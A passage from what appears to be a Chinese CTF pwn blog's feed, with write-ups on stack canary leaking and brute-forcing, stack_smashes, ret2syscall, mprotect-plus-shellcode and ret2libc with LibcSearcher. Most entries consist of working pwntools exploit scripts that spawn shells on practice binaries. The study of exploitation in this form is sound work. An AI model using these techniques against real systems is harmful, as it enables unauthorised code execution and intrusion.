class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>p1 = <span class="hljs-string">&#x27;%&#123;offset&#125;$p\n&#x27;</span>.<span class="hljs-built_in">format</span>(offset = <span class="hljs-number">71</span>)<br><br>p.send(p1)<br>canary_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br><br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>p2 += <span class="hljs-number">0xc</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p2 += p32(target)<br><br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure></li></ol><h1 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/one_by_one_bruteforce">附件下载</a></strong><br><strong>这种方法局限性比较大，必须有fork函数开启子进程。因为fork函数会直接拷贝父进程内存，所以创建的子进程canary都是相同的</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347688.png"><br><strong>我们一直fork开启子进程，一个一个字节的爆破</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./one_by_one_bruteforce&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce1bit</span>() :<br>  <span class="hljs-keyword">global</span> known<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p1 = <span class="hljs-number">0x108</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>    p1 += known<br>    p1 += <span class="hljs-built_in">bytes</span>([i])<br>    p.sendafter(<span class="hljs-string">&#x27;one_by_one_bruteforce\n&#x27;</span>,p1)<br>    <span class="hljs-keyword">try</span> :<br>      info = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;*** stack smashing detected ***&quot;</span> <span class="hljs-keyword">in</span> info :<br>        p.send(<span class="hljs-string">&#x27;n\n&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">else</span> :<br>        known += <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        log.info(<span class="hljs-string">&#x27;wrong&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce_canary</span>():<br>  <span class="hljs-keyword">global</span> known<br>  known += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    bruteforce1bit()<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">6</span> :<br>      p.send(<span class="hljs-string">b&#x27;n\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span> :<br>      p.send(<span class="hljs-string">b&#x27;y\n&#x27;</span>)<br><br>target = <span class="hljs-number">0x000000000040083E</span><br>known = <span class="hljs-string">b&quot;&quot;</span><br>bruteforce_canary()<br>canary = u64(known)  <span class="hljs-comment"># Ensure known is 8 bytes</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(target)<br>p.sendafter(<span class="hljs-string">b&quot;go\n&quot;</span>, p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>| 这两个理解起来都很简单，没有什么难点，看着exp很容易理解</p><h1 id="stack-smashes"><a href="#stack-smashes" class="headerlink" title="stack_smashes"></a>stack_smashes</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/stack_smashes">附件下载</a></strong></p><p><strong>前边已经简绍了，_stack_chk_fail函数会将__libc_agrc[0]的信息打印出来，所以我们可以改变__libc_agrc[0]的地址为我们想要信息的值，那么就能得到相应数据了</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347802.png"><br><strong>首先简绍一下什么是__libc_agrc[0]</strong></p><p><strong>main(int argc , char ,*argv[ ])</strong></p><ol><li><strong>argc为整数</strong></li><li><strong>argv为指针的指针（可理解为：char **argv or: char *argv[] or: char argv[][] ，argv是一个指针数组)</strong><br><strong>注：main()括号内是固定的写法。</strong></li><li><strong>下面给出一个例子来理解这两个参数的用法：</strong><br>**　假设程序的名称为prog，**<br><strong>当只输入prog，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;1,表示只有一程序名称。</strong><br><strong>argc只有一个元素，argv[0]指向输入的程序路径及名称：.&#x2F;prog</strong><br><strong>当输入prog para_1，有一个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;2，表示除了程序名外还有一个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>当输入prog para_1 para_2 有2个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;3，表示除了程序名外还有2个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>argv[2]指向参数para_2字符串。</strong></li><li><strong>void main( int argc, char *argv[] )</strong><br><strong>char *argv[] : argv 是一个指针数组，他的元素个数是argc，存放的是指向每一个参数的指针</strong></li></ol><p><strong>我们本题需要找__libc_agrc[0]和输入的偏移</strong><br><strong>下断点直接到输入函数</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347411.png"><br><strong>第二个参数为输入地址（具体第几个参数，根据函数本身决定）</strong><br><strong>下断点到main</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347668.png"><br><strong>__libc_argv[0]指向的是文件路径</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348166.png"><br><strong>直接算出偏移</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本也是非常easy</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./stack_smashes&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x000000000040087A&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>flag_addr = <span class="hljs-number">0x0000000000601090</span><br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x218</span> + p64(flag_addr)<br>p.sendafter(<span class="hljs-string">&quot;stack_smashes\n&quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="/2024/07/18/not-the-same-3dsctf-2016/"/>
    <url>/2024/07/18/not-the-same-3dsctf-2016/</url>
    
    <content type="html"><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><strong>查看保护就不说了</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182331100.png"></p><p><strong>IDA反编译发现为静态编译，不用找libc了这点节省不少功夫。打开main函数，发现栈溢出漏洞</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332667.png"><br><strong>偏移为45，这个是根据gdb的cyclic算出来的</strong><br><strong>发现后门函数get_secret，功能是把flag读取赋值给fl4g</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182332184.png"><br><strong>初步思路为通过栈溢出，调用get_secret，再通过write函数读取fl4g</strong></p><h2 id="方法一-通过栈溢出调用后门函数"><a href="#方法一-通过栈溢出调用后门函数" class="headerlink" title="方法一 通过栈溢出调用后门函数"></a>方法一 通过栈溢出调用后门函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>write_addr = <span class="hljs-number">0x806E270</span><br>flag_addr = <span class="hljs-number">0x080ECA2D</span><br>target = <span class="hljs-number">0x080489A0</span><br>exit_addr = <span class="hljs-number">0x0804E660</span><br><br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(target)<br>payload += p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(exit_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(flag_addr) + p32(<span class="hljs-number">42</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>我们前面分析这个是静态编译，我们可以直接ret2syscall，通过设置寄存器的值，直接获得shell</strong></p><h2 id="方法二-ret2syscall"><a href="#方法二-ret2syscall" class="headerlink" title="方法二 ret2syscall"></a>方法二 ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br><span class="hljs-comment">#gdb.attach(p , &#x27;b * 0x080489EA&#x27;)</span><br><span class="hljs-comment">#0x08048b0b : pop eax ; ret</span><br>pop_eax = <span class="hljs-number">0x08048b0b</span><br><span class="hljs-comment">#0x0806fcc9 : pop ebx ; pop edx ; ret</span><br>pop_ebx_edx = <span class="hljs-number">0x0806fcc9</span><br><span class="hljs-comment">#0x0806fcf1 : pop ecx ; pop ebx ; ret</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806fcf1</span><br><span class="hljs-comment">#0x0806d8a5 : int 0x80</span><br>int80_addr = <span class="hljs-number">0x0806d8a5</span><br>get_addr = <span class="hljs-number">0x0804F8D0</span><br>data_addr = <span class="hljs-number">0x080EBAD2</span><br>target = <span class="hljs-number">0x080489A0</span><br><span class="hljs-comment">#0x080481ad : pop ebx ; ret</span><br>pop1 = <span class="hljs-number">0x080481ad</span> <br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(get_addr) + p32(pop1) + p32(data_addr)<br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">11</span>)<br>payload += p32(pop_ebx_edx) + p32(data_addr) + p32(<span class="hljs-number">0</span>)<br>payload += p32(int80_addr)<br>payload += p32(target)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>这个看上去有点复杂但是，耐心看下来还是很好理解的，32位getshell需要调用execv&gt;（”&#x2F;bin&#x2F;sh”,null,null)，寄存器eax&#x3D;11，ebx&#x3D;”&#x2F;bin&#x2F;sh”，ecx&#x3D;0，edx&#x3D;0，然后再执行int 0x80</p></blockquote><p><strong>然后我们发现函数列表有mprotect,这个函数可以改变段的执行权限,我们可以开启最高权限,执行shellcode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182334572.png"></p><h2 id="方法三-mprotect配合shellcode"><a href="#方法三-mprotect配合shellcode" class="headerlink" title="方法三 mprotect配合shellcode"></a>方法三 mprotect配合shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr = <span class="hljs-number">0x0806ED40</span><br>pop3_ret = <span class="hljs-number">0x806fcc8</span><br>shellcode = asm(shellcraft.sh())<br>target = <span class="hljs-number">0x80ea000</span><br>binsh_addr = <span class="hljs-number">0x80ec000</span><br><br>payload =  <span class="hljs-number">0x2D</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(mprotect_addr) + p32(pop3_ret)<br>payload += p32(target) + p32(<span class="hljs-number">0x3000</span>) + p32(<span class="hljs-number">0x7</span>)<br>payload += p32(read_addr) + p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-built_in">len</span>(shellcode))<br>payload += p32(binsh_addr)<br><br>p.sendline(payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>BUUCTF刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mprotect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用动态链接动态泄露system地址并利用</title>
    <link href="/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="已知libc库的情况"><a href="#已知libc库的情况" class="headerlink" title="已知libc库的情况"></a>已知libc库的情况</h2><p><strong>在动态编译的程序中，如果没有对system函数的直接调用，在plt中就不会存在system函数，也就是不能直接知道system函数的地址</strong><br><strong>在解决动态编译的二进制文件之前，需要了解动态链接的基础知识，这个过程叫作lzy-binding。程序对外部函数的调用要求在生成可执行文件时将外部函数链接到程序中链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码。动态链接得到的可执行文件不包含外部函数的代码，而是在运行时将动态链接库(若干外部函数的集合)加载到内存的某个位置，在发生调用时再去链接库定位所需的函数。</strong></p><p><strong>这里通过几个简单的概念和过程的分析来说明整个过程。</strong></p><ol><li><strong>GOT。GOT是全局偏移量表(Global0fset Table)，用于存储外部函数在内存中的确切地址。GOT存储在数据段(DataSegment)内，可以在程序运行过程中被修改。</strong></li><li><strong>PIT是程序链接表(Procedure Linkage Table)，用来存储外部函数的人口点(entry),换言之，程序会到 PLT 中寻找外部函数的地址。PLT存储在代码段(CodeSegment)内，在运行之前就已经确定并目不会被修改。</strong></li></ol><p><strong>简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限(在FULLRELRO 保护机制开启的时候，没有读写权限):PLT是外部函数的人口表，存储的是每个外部函数的代码，具有执行权限</strong></p><p><strong>当程序在第一次运行的时候，会进入已被转载进内存中的动态链接库中查找对应的函数和地址，并把函数的地址放到got表中，将got表的地址数据映射为plt表的表项；在程序二次运行的时候，就不用再重新查找函数地址，而是直接通过plt表找到got表中函数的地址，从而执行函数的功能了。</strong><br><strong>在首次调用导出函数时，由于未知函数真正地址（这时表现为xxx@plt），去访问plt表中该函数所在的项（为一段代码，三条指令如上图所示），之后去访问GOT表，又跳到PLT[0]的中（代码段）调用函数_dl_runtime_resolve去获取真正的函数地址并修改对应的GOT表项</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348465.png"><br><strong>还有几点需要注意</strong></p><ol><li><strong>GOT[0] 是.dynamic段的装载地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</strong></li><li><strong>GOT[1] 是动态链接器的标识link_map的地址;</strong></li><li><strong>GOT[2] 包含动态链接器的延迟绑定代码_dl_runtime_resolve的入口点，用于得到真正的函数地址，回写到对应的got表中;</strong></li><li><strong>从 GOT[3] 开始就是函数的地址。</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348896.png"></li></ol><p><strong>对于任意两个函数的偏移是固定的，我们可以根据这个来做题，我们需要泄露一个函数地址，根据偏移来计算基地址，这样就能得到我们想要的地址</strong><br><strong>用一道例题来具体说明一下</strong><br>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc3">附件下载</a><br><strong>首先查看保护</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349307.png"><br><strong>地址随机化，NX开启</strong><br><strong>IDA反编译，没有发现后门函数，所以我们需要调用动态链接库里面的system来getshell</strong><br><strong>第一步：先泄露函数的一个地址</strong><br><strong>我们发现了栈溢出漏洞和put输出函数，那么我们就可以根据这个函数泄露地址</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349095.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc3&quot;)<br>gdb.attach(p,&quot;b *0x0804854C&quot;)<br>elf = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)<br><br>gets_got = elf.got[&quot;gets&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>main_addr = 0x0804854E<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload1 = &quot;a&quot; * 0x108 + p32(1)<br>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)<br>p.sendline(payload1)<br></code></pre></td></tr></table></figure><p><strong>根据EXP我们可以看到，通过调用put函数来打印got表中gets的地址，这样gets的地址就泄露成功了</strong><br><strong>第二步:计算偏移</strong><br><strong>我们泄露了gets函数的地址,那么根据它的偏移,就能得到基地址.base_addr&#x3D; 泄露地址 - 减去偏移</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs [python]">leak_addr = u32(p.recv(4))<br>libc_base = leak_addr - libc.symbols[&quot;gets&quot;]<br>libc.address = libc_base<br>log.success(&quot;libc_base:&quot; + hex(libc.address))<br></code></pre></td></tr></table></figure><p><strong>这里的libc.symbosl[‘’]在设置基地址之前得到的是偏移值,在设置基地址之后得到的是实际地址值</strong><br><strong>第三步:攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs [python]">system = libc.symbols[&quot;system&quot;] #得到实际地址值<br>binsh = libc.search(&quot;/bin/sh&quot;).next() #搜索字符串，返回地址<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload2 = &quot;a&quot; * 0x108 + p32(1)<br>payload2 += p32(system) + p32(1) + p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这样一个已知动态链接库的题就写好了,说到这肯定想问,那要是未知呢?别急接着往下看</strong></p><h2 id="未知动态链接库"><a href="#未知动态链接库" class="headerlink" title="未知动态链接库"></a>未知动态链接库</h2><p><strong>对于未知动态链接库,做题方式和已知链接库是大同小异的,无非是确定libc库是什么版本,我们来看一下怎么确定</strong><br><strong>在我现在学习中,有三种方法(实际肯定不止三种,使用自己觉得好用的就行)</strong></p><ol><li>在 github上有个 libc-database 项目，可以使用项目上的方法找出对应版本。</li><li>在网站 <a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a> 上输入对应的函数名和地址找到 1ibc 版本。</li><li>使用python库libcsearcher</li></ol><p><strong>这里我们说一下第三种</strong></p><ol><li><strong>安装</strong> <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/lieanu/LibcSearcher.git<br><span class="hljs-keyword">cd</span> LibcSearcher<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> develop<br></code></pre></td></tr></table></figure></li><li><strong>基本使用</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs [python]">libc = LibcSearcher(&quot;func&quot;,gets_real_addr)             #寻找匹配的libc版本<br>libcbase = gets_real_addr – obj.dump(&quot;func&quot;)            #确定基地址<br>system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移<br>bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移<br><br><br></code></pre></td></tr></table></figure>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc</a><br><strong>普通栈溢出</strong><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349927.png"><br><strong>这里距离栈底为0x14个字节，但是按照14个字节编写会报错，我们使用cyclic的方法判断溢出，发现距离栈底为0x1c个字节</strong><br><strong>直接上脚本</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>from LibcSearcher import *<br>ret2libc = ELF(&#x27;./1&#x27;)<br>p = process(&#x27;./1&#x27;)<br>p.recvuntil(&#x27;is&#x27;)<br>binsh_addr = int(p.recvuntil(&#x27;\n&#x27; , drop=True) , 16)<br>p.recvuntil(&#x27;is&#x27;)<br>puts_addr = int(p.recvuntil(&#x27;\n&#x27; , drop = True) , 16)<br>libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)<br>base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = base_addr + libc.dump(&#x27;system&#x27;)<br>payload = 32 * b&#x27;a&#x27;  + p32(system_addr) + p32(1) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><strong>做好使用python3运行，别问我怎么知道的~~~~</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写多个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
